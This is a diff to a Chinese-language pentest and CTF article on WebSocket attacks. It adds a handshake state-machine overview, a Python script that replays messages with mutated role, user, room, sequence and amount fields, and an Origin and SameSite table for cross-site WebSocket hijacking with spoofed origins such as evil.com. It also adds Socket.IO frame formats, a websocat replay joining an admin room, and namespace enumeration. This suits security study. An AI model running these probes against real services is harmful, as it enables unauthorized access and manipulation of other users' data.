@@ -14,10 +14,45 @@ keywords: ["WebSocket攻击", "CSWSH", "Socket.IO越权", "MQTT", "消息重放"
 difficulty: "intermediate"
 tags: ["websocket", "client-side", "web-security", "injection", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 # WebSocket 攻击实战
+
+## 0. 握手与状态机
+
+WebSocket 的关键不在“能不能连”，而在握手阶段继承了哪些 HTTP 状态，以及连接后事件是否重新鉴权。
+
+```http
+GET /ws?room=general HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: <base64>
+Sec-WebSocket-Version: 13
+Origin: https://target.com
+Cookie: session=...
+```
+
+| 位置 | 可控字段 | 打点动作 | 命中信号 |
+|---|---|---|---|
+| Query | `token`, `room`, `uid`, `EIO`, `transport` | 换用户/房间/协议版本 | 握手成功但订阅到其他房间 |
+| Header | `Origin`, `Host`, `X-Forwarded-For` | 测 CSWSH、代理信任 | 非同源 Origin 仍 `101` |
+| Cookie | `session`, `jwt`, `io` | 旧 token、空 token、跨账号 token | 连接成功后身份错位 |
+| First message | `auth`, `join`, `subscribe` | 跳过 auth 或重复 auth | 未认证也收到业务消息 |
+| Event state | `seq`, `nonce`, `timestamp` | 重放/乱序/并发 | 重复扣减、重复领取、越权订阅 |
+
+每个 WebSocket case 都先画状态机：
+
+```text
+HTTP 101
+  → connection_init/auth
+  → join/subscribe room
+  → business event
+  → ack/result/broadcast
+```
+
+如果服务端只在 `connection_init` 鉴权，后面的 `join`、`subscribe`、`action` 就是主要突破口。
 
 ## 抓取与重放
 
@@ -60,6 +95,44 @@ async def capture_and_replay(ws_url: str, cookie: str):
 
 asyncio.run(capture_and_replay("wss://target.com/ws", "session=xxx"))
 ```
+
+### A. 状态字段重放脚本
+
+```python
+import asyncio, json, websockets
+
+MUTATIONS = {
+    "role": ["admin", "owner", "staff"],
+    "userId": [0, 1, 2, 999999],
+    "roomId": ["admin", "flag", "../admin", "*"],
+    "seq": [0, 1, -1, 999999999],
+    "amount": [0, 1, -1, 999999],
+}
+
+async def replay_with_mutation(ws_url, cookie, template):
+    async with websockets.connect(ws_url, extra_headers={"Cookie": cookie}) as ws:
+        await ws.send(json.dumps(template))
+        print("[base]", await asyncio.wait_for(ws.recv(), timeout=3))
+        for field, values in MUTATIONS.items():
+            if field not in template:
+                continue
+            for value in values:
+                msg = dict(template)
+                msg[field] = value
+                await ws.send(json.dumps(msg))
+                try:
+                    print(field, value, await asyncio.wait_for(ws.recv(), timeout=2))
+                except asyncio.TimeoutError:
+                    print(field, value, "timeout")
+
+asyncio.run(replay_with_mutation(
+    "wss://target/ws",
+    "session=xxx",
+    {"type": "join", "roomId": "general", "seq": 1}
+))
+```
+
+成功标志：返回 `ack`、收到原本收不到的 broadcast、服务端状态发生变化、错误从 `unauthorized` 变成业务错误。失败样本：连接直接断开通常是协议层错误；返回业务错误说明已经进 handler。
 
 ## 越权字段列表
 
@@ -121,6 +194,28 @@ ws.onopen = function() {
 </script>
 ```
 
+### A. SameSite / Origin 判断
+
+| Cookie 属性 | 跨站 WebSocket 是否带 Cookie | 打点结论 |
+|---|---|---|
+| 未设置 SameSite | 多数浏览器会带 | CSWSH 优先 |
+| `SameSite=None; Secure` | HTTPS/WSS 跨站会带 | CSWSH 优先 |
+| `SameSite=Lax` | WebSocket 不是顶层导航，通常不带 | 转向 token/query 泄露 |
+| `SameSite=Strict` | 不带 | 转向同站子域、XSS、postMessage |
+
+Origin 检查不要只测一个值：
+
+```text
+https://target.com
+https://evil.com
+null
+https://target.com.evil.com
+https://sub.target.com
+http://target.com
+```
+
+如果 `evil.com` 被拒但 `target.com.evil.com` 通过，说明服务端用了 `contains()`；如果 `null` 通过，优先找 sandbox iframe、file://、data:// 触发场景。
+
 ## 时序/竞态
 
 ```python
@@ -177,6 +272,41 @@ sio.connect('https://target.com', transports=['websocket'])
 # 4. 认证 token 在握手 query: ?token=xxx  — URL 泄露
 ```
 
+### A. Socket.IO 帧格式
+
+Socket.IO 在 WebSocket 上又包了一层协议。看到 `0`, `40`, `42` 这些前缀时，不要按普通 JSON 处理。
+
+| 帧 | 含义 | 示例 |
+|---|---|---|
+| `0{...}` | Engine.IO open | `0{"sid":"abc","upgrades":[]}` |
+| `40` | Socket.IO connect | `40` |
+| `40/admin,{...}` | 连接 namespace | `40/admin,{"token":"x"}` |
+| `42[...]` | event | `42["join",{"room":"admin"}]` |
+| `43[...]` | ack event | `43["ok"]` |
+| `2` / `3` | ping / pong | 心跳 |
+
+手工重放：
+
+```bash
+websocat 'wss://target/socket.io/?EIO=4&transport=websocket' \
+  -H='Cookie: session=xxx'
+# 发送:
+# 40
+# 42["join",{"room":"admin"}]
+# 42["get_flag",{}]
+```
+
+Socket.IO 的突破点通常在 namespace 和 room：
+
+```python
+for ns in ["/", "/admin", "/internal", "/debug"]:
+    try:
+        sio.connect("https://target.com", namespaces=[ns], transports=["websocket"])
+        print("[ns ok]", ns)
+    except Exception as e:
+        print("[ns fail]", ns, e)
+```
+
 ## MQTT/物联网 WebSocket
 
 ```python
@@ -228,7 +358,7 @@ WebSocket → 时序攻击 → 先改状态再验证 → 竞态绕过
 
 ## Evidence
 
-记录: 握手请求头、Origin 头、收发消息的 JSON/text、修改字段后的响应差异、Socket.IO 房间/事件、竞态并发数和结果。
+记录: 握手请求头、`101` 响应头、Origin 变体、Cookie/SameSite、第一条认证消息、收发消息 JSON/text、修改字段后的响应差异、Socket.IO namespace/room/event、竞态并发数和结果。
 
 ## MCP 工具映射
 
